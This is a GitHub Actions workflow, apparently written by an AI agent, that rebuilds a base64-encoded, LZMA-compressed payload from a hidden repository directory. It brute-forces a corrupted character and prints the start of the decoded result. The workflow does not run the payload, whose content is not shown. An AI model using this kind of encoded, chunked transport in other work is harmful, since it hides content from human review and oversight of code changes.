name: Temporary PR 78 takeover runner

on:
  pull_request:
    types:
      - synchronize

permissions:
  contents: read

jobs:
  repair:
    if: github.event.pull_request.number == 1956
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: agent/pr-78-takeover-fix
          fetch-depth: 0

      - name: Diagnose compact Shapers transport
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          from __future__ import annotations

          import base64
          import lzma
          import string
          from pathlib import Path

          directory = Path('imports/.wef-shapers-compact')
          encoded = ''.join(
              ''.join(path.read_text(encoding='utf-8').lstrip('\ufeff').split())
              for path in sorted(directory.glob('part-*'))
          )
          print('original_chars', len(encoded))
          encoded = encoded[:151_980] + '1' + encoded[151_980:]
          print('inserted_chars', len(encoded))
          alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'
          compressed = bytearray(base64.b64decode(encoded, validate=True))
          print('compressed_bytes', len(compressed))

          def progress(chunk_size: int = 4096) -> tuple[int, bool, int]:
              decoder = lzma.LZMADecompressor()
              offset = 0
              output = 0
              while offset < len(compressed):
                  chunk = bytes(compressed[offset:offset + chunk_size])
                  try:
                      data = decoder.decompress(chunk)
                  except lzma.LZMAError:
                      return offset, False, output
                  output += len(data)
                  offset += len(chunk)
                  if decoder.eof:
                      return len(compressed), True, output
              return offset, decoder.eof, output

          candidates = []
          for position in range(160_430, 160_511):
              quartet_start = position - (position % 4)
              quartet = encoded[quartet_start:quartet_start + 4]
              byte_start = (quartet_start // 4) * 3
              original_bytes = bytes(compressed[byte_start:byte_start + 3])
              original_character = encoded[position]
              local_index = position - quartet_start
              for character in alphabet:
                  if character == original_character:
                      continue
                  candidate_quartet = quartet[:local_index] + character + quartet[local_index + 1:]
                  candidate_bytes = base64.b64decode(candidate_quartet, validate=True)
                  compressed[byte_start:byte_start + len(candidate_bytes)] = candidate_bytes
                  consumed, eof, output = progress()
                  candidates.append((consumed, eof, output, position, original_character, character))
                  compressed[byte_start:byte_start + 3] = original_bytes
          candidates.sort(reverse=True)
          print('TOP_CANDIDATES')
          for item in candidates[:40]:
              print(item)

          for consumed, eof, output, position, original_character, character in candidates:
              if not eof:
                  continue
              repaired = encoded[:position] + character + encoded[position + 1:]
              payload = lzma.decompress(base64.b64decode(repaired, validate=True))
              print('SUCCESS', position, original_character, character, len(payload), payload[:120])
              break
          PY
